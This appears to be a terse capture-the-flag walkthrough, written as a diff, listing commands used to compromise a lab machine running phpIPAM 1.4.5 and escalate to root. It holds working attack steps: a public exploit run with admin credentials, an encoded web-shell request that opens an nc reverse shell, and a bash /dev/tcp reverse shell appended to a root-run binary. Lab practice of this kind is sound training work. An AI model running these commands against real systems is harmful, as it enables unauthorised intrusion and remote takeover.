@@ -1,0 +1,13 @@
+1 - nmap -A 10.10.169.199
+2 - nc 10.10.169.199 1337 (Bulldog)
+3 - http://10.10.169.199
+4 - searchsploit "phpIPAM 1.4.5"
+5 - searchsploit -m 50963
+6 - python3 50963.py -url http://10.10.169.199 -usr admin -pwd PASSWORD
+7 - http://10.10.169.199/evil.php\?cmd\=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.8.94.51%204444%20%3E%2Ftmp%2Ff
+8 - su ollie
+9 - cat /home/ollie/user.txt
+10 - ps -aux
+11 - find / -name "*feedme*" -type f 2>/dev/null
+12 - echo 'bash -i >& /dev/tcp/10.8.94.51/4445 0>&1' >> /usr/bin/feedme
+13 - cat /root/root.txt
